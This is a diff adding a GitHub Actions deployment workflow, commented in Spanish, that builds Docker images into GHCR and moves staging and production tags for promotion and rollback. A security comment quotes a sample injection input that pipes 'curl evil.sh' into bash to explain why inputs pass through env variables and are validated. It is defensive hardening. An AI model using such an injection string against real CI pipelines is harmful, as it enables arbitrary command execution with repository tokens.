@@ -1,5 +1,142 @@
-# TODO: Fase 14 - workflow de despliegue continuo (staging/production, tags, rollback).
-name: CD (pendiente - Fase 14)
+name: CD
 
+# Sin servidor/VPS/cuenta de nube real (decisión explícita del usuario, ver
+# docs/architecture.md, Fase 14) - "staging"/"producción" se modelan como DOS
+# TAGS de la misma imagen en GHCR (GitHub Container Registry), no dos
+# entornos reales. "staging" se mueve solo automáticamente (tras CI en
+# verde en main); "production" solo se mueve con una acción manual explícita
+# (workflow_dispatch) - lo que un sistema de despliegue externo (fuera de
+# alcance) consumiría.
 on:
-  workflow_dispatch: {}
+  workflow_run:
+    workflows: ["CI"]
+    types: [completed]
+    branches: [main]
+  workflow_dispatch:
+    inputs:
+      target_sha:
+        description: "SHA corto (7 chars) de un build ya publicado (tag sha-<...> en GHCR) a apuntar como producción - promover y hacer rollback son la MISMA operación, solo cambia si el SHA es más nuevo o más viejo que el actual de production"
+        required: true
+        type: string
+
+# Sin esto, dos pushes seguidos a main dispararían dos "build-and-push" en
+# paralelo compitiendo por el tag "staging" (last-writer-wins, "staging"
+# podría no reflejar el commit más nuevo). Mismo patrón ya usado en ci.yml.
+concurrency:
+  group: cd-${{ github.event.workflow_run.head_branch || 'manual' }}
+  cancel-in-progress: false # nunca cancelar un push/create de registry a mitad
+
+jobs:
+  # NOTA (dependencia implícita): este job solo corre si el workflow "CI"
+  # concluyó "success", lo que hoy implica que TANTO el job "test" COMO el
+  # job "docker" de ci.yml pasaron (docker no tiene "if:" propio, solo
+  # "needs: test" - no puede quedar "skipped" con test en verde). Si ci.yml
+  # cambiara esa relación en el futuro (ej. un "if:" condicional en el job
+  # docker), esta garantía ("CD solo publica imágenes ya smoke-testeadas")
+  # dejaría de cumplirse silenciosamente - revisar si se toca ese job.
+  build-and-push:
+    if: github.event_name == 'workflow_run' && github.event.workflow_run.conclusion == 'success'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      packages: write
+    env:
+      # Envarizado por consistencia con set-production-tag más abajo, aunque
+      # el riesgo real aquí es bajo (head_sha es un SHA de 40-hex generado
+      # por GitHub, no input de usuario).
+      HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
+      # ${{ github.repository }} tampoco es input de usuario (charset seguro,
+      # sin riesgo real de inyección), pero se envariza igual por consistencia
+      # con la norma del archivo (hallazgo de la revisión post-implementación).
+      REPO: ${{ github.repository }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.workflow_run.head_sha }} # el commit exacto que CI validó, no HEAD
+
+      - name: Setup Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Login a GHCR
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Calcular tags (SHA corto + staging)
+        id: tags
+        run: |
+          SHA_SHORT=$(echo "$HEAD_SHA" | cut -c1-7)
+          IMAGE="ghcr.io/$(echo "$REPO" | tr '[:upper:]' '[:lower:]')"
+          echo "sha_tag=$IMAGE:sha-$SHA_SHORT" >> "$GITHUB_OUTPUT"
+          echo "staging_tag=$IMAGE:staging" >> "$GITHUB_OUTPUT"
+
+      - name: Build y push
+        # Reconstruye la imagen (no reutiliza el artefacto exacto que ya
+        # construyó y smoke-testeó el job "docker" de ci.yml sobre el mismo
+        # commit) - con la imagen base pinneada (python:3.12.7-slim-bookworm,
+        # no "latest") el riesgo de deriva entre ambos builds es bajo;
+        # reutilizar el artefacto exacto exigiría subir/bajar la imagen como
+        # artifact intermedio entre workflows, complejidad no proporcional al
+        # alcance de esta fase. No repite el smoke test de ci.yml - sería
+        # trabajo redundante, CI ya probó que este Dockerfile arranca y
+        # responde /health con Redis real.
+        uses: docker/build-push-action@v6
+        with:
+          context: .
+          push: true
+          tags: |
+            ${{ steps.tags.outputs.sha_tag }}
+            ${{ steps.tags.outputs.staging_tag }}
+
+  set-production-tag:
+    if: github.event_name == 'workflow_dispatch'
+    runs-on: ubuntu-latest
+    permissions:
+      packages: write
+    env:
+      # NUNCA interpolar ${{ inputs.target_sha }} directo dentro de un bloque
+      # `run:` (encontrado en la revisión del plan, severidad alta): GitHub
+      # Actions sustituye la expresión textualmente en el script ANTES de
+      # que bash lo ejecute - las comillas dobles alrededor NO protegen, un
+      # input como `x"; curl evil.sh | bash; "` cierra la cadena e inyecta
+      # comandos arbitrarios con el token del runner (packages: write). Pasar
+      # por `env:` sí es seguro (Actions lo expone como variable de entorno
+      # real, no como texto sustituido en el script).
+      TARGET_SHA: ${{ inputs.target_sha }}
+      # Igual que en build-and-push, envarizado por consistencia (hallazgo de
+      # la revisión post-implementación), no por riesgo real de inyección.
+      REPO: ${{ github.repository }}
+    steps:
+      - name: Validar formato del SHA objetivo (defensa en profundidad)
+        run: |
+          if ! [[ "$TARGET_SHA" =~ ^[0-9a-f]{7}$ ]]; then
+            echo "target_sha debe ser un SHA corto de 7 caracteres hexadecimales, recibido: $TARGET_SHA"
+            exit 1
+          fi
+
+      - name: Login a GHCR
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Verificar que el SHA objetivo ya fue publicado
+        # Falla alto y claro (bash -eo pipefail por defecto en Actions) si
+        # alguien introduce un SHA que nunca se publicó, en vez de crear un
+        # tag "production" roto silenciosamente en el siguiente step.
+        run: |
+          IMAGE="ghcr.io/$(echo "$REPO" | tr '[:upper:]' '[:lower:]')"
+          docker buildx imagetools inspect "$IMAGE:sha-$TARGET_SHA"
+
+      - name: Apuntar "production" al SHA objetivo (promoción o rollback - misma operación)
+        # Operación de registry-a-registry (copia el manifest existente, sin
+        # reconstruir ni volver a subir capas) - promueve exactamente los
+        # mismos bytes que ya se probaron en CI.
+        run: |
+          IMAGE="ghcr.io/$(echo "$REPO" | tr '[:upper:]' '[:lower:]')"
+          docker buildx imagetools create \
+            --tag "$IMAGE:production" \
+            "$IMAGE:sha-$TARGET_SHA"
